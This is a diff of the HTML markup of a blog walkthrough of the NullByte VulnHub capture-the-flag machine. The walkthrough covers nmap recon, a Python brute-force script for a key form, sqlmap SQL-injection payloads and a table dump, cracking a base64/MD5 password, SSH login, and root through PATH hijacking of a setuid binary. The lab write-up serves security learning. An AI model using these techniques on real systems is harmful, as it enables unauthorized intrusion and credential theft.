@@ -94,18 +94,20 @@
     </header>
 
     <div class="entry-content">
-            <p><img alt="NullByte" class="align-left" src="/media/2015.09/main.gif" width="162"/></p>
+            <p><img class="align-left"
+src="/media/2015.09/main.gif" alt="NullByte" width="162"></p>
 <p>After the <a href="http://maggick.fr/2015/09/acid.html">Acid</a> challenge I was
 really motivated. Therefore I give a look at another vulnhub machine I had already
 download since a while:
 <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">NullByte</a>.</p>
 
+
 <p>The goal is to root the server.</p>
-<h2 id="host discovery">Host discovery</h2>
+<h2>Host discovery</h2>
 <p>As always, we start with the host discovery with <a href="http://nmap.org">nmap</a>,
 <a href="https://cirt.net/Nikto2">nikto</a> and
 <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a>:</p>
-<h3 id="nmap">nmap</h3>
+<h3>nmap</h3>
 <div class="highlight"><pre><span></span>nmap 192.168.0.20 -p0-65535 -A -oA nmap
 # Nmap 6.47 scan initiated Thu Sep 10 10:01:29 2015 as: nmap -p0-65535 -A -oA nmap 192.168.0.20
 Nmap scan report for 192.168.0.20
@@ -132,12 +134,14 @@ OS details: Linux 3.11 - 3.14
 Network Distance: 1 hop
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </pre></div>
+
+
 <p>There is an HTTP server on the port 80 and an ssh service on port 777.</p>
-<h2 id="exploitation_1">Exploitation</h2>
+<h2>Exploitation</h2>
 <p>The web server display a picture with a simple message. Neither nikto nor
 dirbuster give us some lead.  Let us run <code>exiftool</code> on the picture:</p>
-<h3 id="main.gif">main.gif</h3>
-<p><img alt="main.gif" src="/media/2015.09/main.gif"/></p>
+<h3>main.gif</h3>
+<p><img alt="main.gif" src="/media/2015.09/main.gif"></p>
 <p>The comment filed is interesting:</p>
 <div class="highlight"><pre><span></span><span class="n">ExifTool</span> <span class="k">Version</span> <span class="nb">Number</span>         <span class="p">:</span> <span class="mi">8</span><span class="p">.</span><span class="mi">60</span>
 <span class="n">File</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">main</span><span class="p">.</span><span class="n">gif</span>
@@ -157,8 +161,10 @@ dirbuster give us some lead.  Let us run <code>exiftool</code> on the picture:</
 <span class="k">Comment</span>                         <span class="p">:</span> <span class="n">P</span><span class="o">-</span><span class="p">):</span> <span class="n">kzMb5nVYJw</span>
 <span class="n">Image</span> <span class="k">Size</span>                      <span class="p">:</span> <span class="mi">235</span><span class="n">x302</span>
 </pre></div>
+
+
 <p>What can we do with that?</p>
-<h3 id="kzmb5nvyjw">kzMb5nVYJw</h3>
+<h3>kzMb5nVYJw</h3>
 <p>If we put this at the end of our url with land on another page. Dirbuster will
 never have find something like that!</p>
 <p>It is a simple web page asking us for a key. When looking at the page code we
@@ -171,21 +177,23 @@ I am not a huge fan of bruteforce but I wrote a simple script that use one of my
 password dictionary (mostly common word).</p>
 <div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
 
-<span class="n">url</span> <span class="o">=</span> <span class="s1">'http://192.168.0.20/kzMb5nVYJw/index.php'</span>
-<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">'/usr/share/dict/cracklib-small'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.0.20/kzMb5nVYJw/index.php&#39;</span>
+<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/usr/share/dict/cracklib-small&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
 <span class="n">password</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
-<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'key'</span><span class="p">:</span><span class="n">password</span><span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">}</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
-<span class="k">while</span> <span class="s1">'invalid'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+<span class="k">while</span> <span class="s1">&#39;invalid&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
     <span class="n">password</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'key'</span><span class="p">:</span><span class="n">password</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">}</span>
     <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
 
 <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
 <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </pre></div>
+
+
 <p>The password was "elite" and by entering it, we land on a new page.</p>
-<h3 id="420search.php">420search.php</h3>
+<h3>420search.php</h3>
 <p>The <code>420search.php</code> page let us query for an user. If we search 'plop' we got:</p>
 <blockquote>
 <p>Fetched data successfully</p>
@@ -195,11 +203,11 @@ password dictionary (mostly common word).</p>
 <p>EMP ID :1
 EMP NAME : ramses
 EMP POSITION :</p>
-<hr/>
+<hr>
 <p>EMP ID :2
 EMP NAME : isis
 EMP POSITION : employee</p>
-<hr/>
+<hr>
 <p>Fetched data successfully</p>
 </blockquote>
 <p>This time it is probably a SQL injection as there is no mention against it in
@@ -210,49 +218,51 @@ that corresponds to your MySQL server version for the right syntax to use near
 '%"' at line 1</p>
 </blockquote>
 <p>It looks like an SQL injection.</p>
-<h3 id="sqli">SQLi</h3>
+<h3>SQLi</h3>
 <p>Let us launch <a href="http://sqlmap.org">sqlmap</a>:</p>
-<div class="highlight"><pre><span></span>[<span class="nv">maggick</span>@<span class="nv">rootine</span> <span class="nv">sqlmap</span>]$ <span class="nv">python2</span> <span class="nv">sqlmap</span>.<span class="nv">py</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">'</span><span class="s">http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop</span><span class="s1">'</span>
+<div class="highlight"><pre><span></span>[<span class="nv">maggick</span>@<span class="nv">rootine</span> <span class="nv">sqlmap</span>]$ <span class="nv">python2</span> <span class="nv">sqlmap</span>.<span class="nv">py</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">&#39;</span><span class="s">http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop</span><span class="s1">&#39;</span>
          <span class="nv">_</span>
  <span class="nv">___</span> <span class="nv">___</span><span class="o">|</span> <span class="o">|</span><span class="nv">_____</span> <span class="nv">___</span> <span class="nv">___</span>  {<span class="mi">1</span>.<span class="mi">0</span><span class="o">-</span><span class="nv">dev</span><span class="o">-</span><span class="nv">e8f87bf</span>}
-<span class="o">|</span><span class="nv">_</span> <span class="o">-|</span> . <span class="o">|</span> <span class="o">|</span>     <span class="o">|</span> .<span class="s1">'</span><span class="s">| . |</span>
+<span class="o">|</span><span class="nv">_</span> <span class="o">-|</span> . <span class="o">|</span> <span class="o">|</span>     <span class="o">|</span> .<span class="s1">&#39;</span><span class="s">| . |</span>
 <span class="o">|</span><span class="nv">___</span><span class="o">|</span><span class="nv">_</span>  <span class="o">|</span><span class="nv">_</span><span class="o">|</span><span class="nv">_</span><span class="o">|</span><span class="nv">_</span><span class="o">|</span><span class="nv">_</span><span class="o">|</span><span class="nv">__</span>,<span class="o">|</span>  <span class="nv">_</span><span class="o">|</span>
       <span class="o">|</span><span class="nv">_</span><span class="o">|</span>           <span class="o">|</span><span class="nv">_</span><span class="o">|</span>   <span class="nv">http</span>:<span class="o">//</span><span class="nv">sqlmap</span>.<span class="nv">org</span>
 
-[<span class="o">!</span>] <span class="nv">legal</span> <span class="nv">disclaimer</span>: <span class="nv">Usage</span> <span class="nv">of</span> <span class="nv">sqlmap</span> <span class="k">for</span> <span class="nv">attacking</span> <span class="nv">targets</span> <span class="nv">without</span> <span class="nv">prior</span> <span class="nv">mutual</span> <span class="nv">consent</span> <span class="nv">is</span> <span class="nv">illegal</span>. <span class="nv">It</span> <span class="nv">is</span> <span class="nv">the</span> <span class="k">end</span> <span class="nv">user</span><span class="s1">'</span><span class="s">s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+[<span class="o">!</span>] <span class="nv">legal</span> <span class="nv">disclaimer</span>: <span class="nv">Usage</span> <span class="nv">of</span> <span class="nv">sqlmap</span> <span class="k">for</span> <span class="nv">attacking</span> <span class="nv">targets</span> <span class="nv">without</span> <span class="nv">prior</span> <span class="nv">mutual</span> <span class="nv">consent</span> <span class="nv">is</span> <span class="nv">illegal</span>. <span class="nv">It</span> <span class="nv">is</span> <span class="nv">the</span> <span class="k">end</span> <span class="nv">user</span><span class="s1">&#39;</span><span class="s">s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
 
 [<span class="o">*</span>] <span class="nv">starting</span> <span class="nv">at</span> <span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>
 
-[<span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>] [<span class="nv">INFO</span>] <span class="nv">resuming</span> <span class="nv">back</span><span class="o">-</span><span class="k">end</span> <span class="nv">DBMS</span> <span class="s1">'</span><span class="s">mysql</span><span class="s1">'</span> 
+[<span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>] [<span class="nv">INFO</span>] <span class="nv">resuming</span> <span class="nv">back</span><span class="o">-</span><span class="k">end</span> <span class="nv">DBMS</span> <span class="s1">&#39;</span><span class="s">mysql</span><span class="s1">&#39;</span> 
 [<span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>] [<span class="nv">INFO</span>] <span class="nv">testing</span> <span class="nv">connection</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">target</span> <span class="nv">URL</span>
 <span class="nv">sqlmap</span> <span class="nv">identified</span> <span class="nv">the</span> <span class="nv">following</span> <span class="nv">injection</span> <span class="nv">points</span> <span class="nv">with</span> <span class="nv">a</span> <span class="nv">total</span> <span class="nv">of</span> <span class="mi">0</span> <span class="nv">HTTP</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span> <span class="nv">requests</span>:
 <span class="o">---</span>
 <span class="nv">Parameter</span>: <span class="nv">usrtosearch</span> <span class="ss">(</span><span class="nv">GET</span><span class="ss">)</span>
     <span class="nv">Type</span>: <span class="nv">boolean</span><span class="o">-</span><span class="nv">based</span> <span class="nv">blind</span>
     <span class="nv">Title</span>: <span class="nv">OR</span> <span class="nv">boolean</span><span class="o">-</span><span class="nv">based</span> <span class="nv">blind</span> <span class="o">-</span> <span class="nv">WHERE</span> <span class="nv">or</span> <span class="nv">HAVING</span> <span class="nv">clause</span> <span class="ss">(</span><span class="nv">MySQL</span> <span class="nv">comment</span><span class="ss">)</span>
-    <span class="nv">Payload</span>: <span class="nv">usrtosearch</span><span class="o">=-</span><span class="mi">8936</span><span class="s2">"</span><span class="s"> OR 8832=8832#</span>
+    <span class="nv">Payload</span>: <span class="nv">usrtosearch</span><span class="o">=-</span><span class="mi">8936</span><span class="s2">&quot;</span><span class="s"> OR 8832=8832#</span>
 
     <span class="nv">Type</span>: <span class="nv">AND</span><span class="o">/</span><span class="nv">OR</span> <span class="nv">time</span><span class="o">-</span><span class="nv">based</span> <span class="nv">blind</span>
     <span class="nv">Title</span>: <span class="nv">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span>.<span class="mi">0</span>.<span class="mi">12</span> <span class="nv">AND</span> <span class="nv">time</span><span class="o">-</span><span class="nv">based</span> <span class="nv">blind</span> <span class="ss">(</span><span class="nv">SELECT</span> <span class="o">-</span> <span class="nv">comment</span><span class="ss">)</span>
-    <span class="nv">Payload</span>: <span class="nv">usrtosearch</span><span class="o">=</span><span class="nv">plop</span><span class="s2">"</span><span class="s"> AND (SELECT * FROM (SELECT(SLEEP(5)))bhRc)#</span>
+    <span class="nv">Payload</span>: <span class="nv">usrtosearch</span><span class="o">=</span><span class="nv">plop</span><span class="s2">&quot;</span><span class="s"> AND (SELECT * FROM (SELECT(SLEEP(5)))bhRc)#</span>
 
     <span class="nv">Type</span>: <span class="nv">UNION</span> <span class="nv">query</span>
     <span class="nv">Title</span>: <span class="nv">MySQL</span> <span class="nv">UNION</span> <span class="nv">query</span> <span class="ss">(</span><span class="nv">NULL</span><span class="ss">)</span> <span class="o">-</span> <span class="mi">3</span> <span class="nv">columns</span>
-    <span class="nv">Payload</span>: <span class="nv">usrtosearch</span><span class="o">=</span><span class="nv">plop</span><span class="s2">"</span><span class="s"> UNION ALL SELECT CONCAT(0x71706b7871,0x5355686d62645446514a,0x7162716271),NULL,NULL#</span>
+    <span class="nv">Payload</span>: <span class="nv">usrtosearch</span><span class="o">=</span><span class="nv">plop</span><span class="s2">&quot;</span><span class="s"> UNION ALL SELECT CONCAT(0x71706b7871,0x5355686d62645446514a,0x7162716271),NULL,NULL#</span>
 <span class="o">---</span>
 [<span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>] [<span class="nv">INFO</span>] <span class="nv">the</span> <span class="nv">back</span><span class="o">-</span><span class="k">end</span> <span class="nv">DBMS</span> <span class="nv">is</span> <span class="nv">MySQL</span>
 <span class="nv">web</span> <span class="nv">server</span> <span class="nv">operating</span> <span class="nv">system</span>: <span class="nv">Linux</span> <span class="nv">Debian</span>
 <span class="nv">web</span> <span class="nv">application</span> <span class="nv">technology</span>: <span class="nv">Apache</span> <span class="mi">2</span>.<span class="mi">4</span>.<span class="mi">10</span>
 <span class="nv">back</span><span class="o">-</span><span class="k">end</span> <span class="nv">DBMS</span>: <span class="nv">MySQL</span> <span class="mi">5</span>.<span class="mi">0</span>.<span class="mi">12</span>
-[<span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>] [<span class="nv">INFO</span>] <span class="nv">fetched</span> <span class="nv">data</span> <span class="nv">logged</span> <span class="nv">to</span> <span class="nv">text</span> <span class="nv">files</span> <span class="nv">under</span> <span class="s1">'</span><span class="s">/home/maggick/.sqlmap/output/192.168.0.20</span><span class="s1">'</span>
+[<span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>] [<span class="nv">INFO</span>] <span class="nv">fetched</span> <span class="nv">data</span> <span class="nv">logged</span> <span class="nv">to</span> <span class="nv">text</span> <span class="nv">files</span> <span class="nv">under</span> <span class="s1">&#39;</span><span class="s">/home/maggick/.sqlmap/output/192.168.0.20</span><span class="s1">&#39;</span>
 
 [<span class="o">*</span>] <span class="nv">shutting</span> <span class="nv">down</span> <span class="nv">at</span> <span class="mi">15</span>:<span class="mi">25</span>:<span class="mi">23</span>
 </pre></div>
+
+
 <p><code>python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' --current-db</code>
 got us the name of the current databse: <strong>seth</strong>.</p>
 <p><code>python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' -D seth --tables</code>
 got us the list of the tables in the database <strong>seth</strong>. There is only one table : <strong>users</strong>. Let us drop it:</p>
-<div class="highlight"><pre><span></span>$python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop' -D seth --dump
+<div class="highlight"><pre><span></span>$python2 sqlmap.py -u &#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&#39; -D seth --dump
 +----+---------------------------------------------+--------+------------+
 | id | pass                                        | user   | position   |
 +----+---------------------------------------------+--------+------------+
@@ -260,20 +270,24 @@ got us the list of the tables in the database <strong>seth</strong>. There is on
 | 2  | --not allowed--                             | isis   | employee   |
 +----+---------------------------------------------+--------+------------+
 </pre></div>
+
+
 <p>It seems that ramses pass(word) is base64 encoded. After decoding, we got:
 <strong>c6d6bd7ebf806f43c76acc3681703b81</strong> which looks like a md5 hash. A simple
 google search give us the associated password: <strong>omega</strong>.</p>
 <p>We have a username and a password. We have also seen a ssh port at the nmap
 stage.</p>
-<h2 id="shell exploitation_1">Shell exploitation</h2>
-<h3 id="ssh">ssh</h3>
+<h2>Shell exploitation</h2>
+<h3>ssh</h3>
 <p>We try to connect to the non standard ssh port as ramses:</p>
 <div class="highlight"><pre><span></span>$ ssh 192.168.0.20 -p 777 -lramses
-ramses@192.168.0.20's password:
+ramses@192.168.0.20&#39;s password:
 omega
 </pre></div>
+
+
 <p>And it works.</p>
-<h3 id="privilege elevation">Privilege elevation</h3>
+<h3>Privilege elevation</h3>
 <p>We got a shell as a user now we need privilege escalation to become root. After
 trying <code>sudo su</code> we look at the <code>bash_history</code>:</p>
 <div class="highlight"><pre><span></span><span class="nv">ramses</span>@<span class="nv">NullByte</span>:<span class="o">~</span>$ <span class="nv">cat</span> .<span class="nv">bash_history</span>
@@ -292,16 +306,22 @@ trying <code>sudo su</code> we look at the <code>bash_history</code>:</p>
 <span class="nv">ls</span>
 <span class="k">exit</span>
 </pre></div>
+
+
 <p>Let see the <code>/var/www/backup/</code> folder:</p>
 <div class="highlight"><pre><span></span><span class="n">ramses</span><span class="nv">@NullByte</span><span class="err">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"></span>
 <span class="n">total</span><span class="w"> </span><span class="mi">12</span><span class="w"></span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4932</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">01</span><span class="err">:</span><span class="mi">29</span><span class="w"> </span><span class="n">procwatch</span><span class="w"></span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 root root   28 Aug  2 01:36 readme.txt</span>
 </pre></div>
+
+
 <p>Interesting, we read the readme.txt file:</p>
 <div class="highlight"><pre><span></span><span class="n">ramses</span><span class="nv">@NullByte</span><span class="err">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
 <span class="n">I</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">fix</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">mess</span><span class="p">...</span><span class="w"></span>
 </pre></div>
+
+
 <p>We execute <code>procwatch</code>:</p>
 <p>ramses@NullByte:/var/www/backup$ ./procwatch
   PID TTY          TIME CMD
@@ -317,19 +337,29 @@ wanted by the program.</p>
 <p>First of all we create a file with the command we want to execute and name it <code>ps</code>:</p>
 <div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ echo /bin/sh &gt; ~/ps
 </pre></div>
+
+
 <p>We give the execution right to this file:</p>
 <div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ chmod +x ~/ps
 </pre></div>
+
+
 <p>We add the directory where we created this file to our PATH:</p>
 <div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ export PATH=~/:$PATH
 </pre></div>
+
+
 <p>We execute the original program:</p>
 <div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ ./procwatch
 </pre></div>
+
+
 <p>Magic happened, we got a root shell:</p>
 <div class="highlight"><pre><span></span># whoami
 root
 </pre></div>
+
+
 <p>Now we just need to search the flag:</p>
 <div class="highlight"><pre><span></span># <span class="nv">ls</span> <span class="o">/</span><span class="nv">root</span>
 <span class="nv">proof</span>.<span class="nv">txt</span>
@@ -363,7 +393,9 @@ root
 <span class="o">=</span><span class="nv">PiAQ</span>
 <span class="o">-----</span><span class="k">END</span> <span class="nv">PGP</span> <span class="nv">PUBLIC</span> <span class="nv">KEY</span> <span class="nv">BLOCK</span><span class="o">-----</span>
 </pre></div>
-<h2 id="conclusion_1">Conclusion</h2>
+
+
+<h2>Conclusion</h2>
 <p>This box was fun. The url were unpredictable and dirbuster doesn't spoil all the
 fun for us. Thank to <a href="https://twitter.com/@ly0nx">@ly0nx</a> for this box and
 <a href="http://vulnhub.com">vulnhub</a> as always.</p>
